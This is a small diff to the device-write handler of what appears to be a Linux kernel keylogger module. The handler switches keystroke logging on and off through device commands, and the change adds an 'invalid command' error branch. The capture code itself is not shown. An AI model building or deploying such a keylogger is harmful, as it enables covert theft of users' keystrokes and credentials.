@@ -205,11 +205,15 @@ static ssize_t dev_write (struct file *f, const char __user *buf, size_t len, lo
 		printk("Keylogger: activated\n");
 		run_keylogger();
 	}
-else if(compareBufs(buf, "exitkeylogger", len-1))
+	else if(compareBufs(buf, "exitkeylogger", len-1))
 	{
 		printk("Keylogger: deactivated\n");
 		exit_keylogger();
 	}
+	else
+	{	
+		printk(KERN_ERR "Invalid command, nothing done\n");
+	}	
 	return len;
 }
 
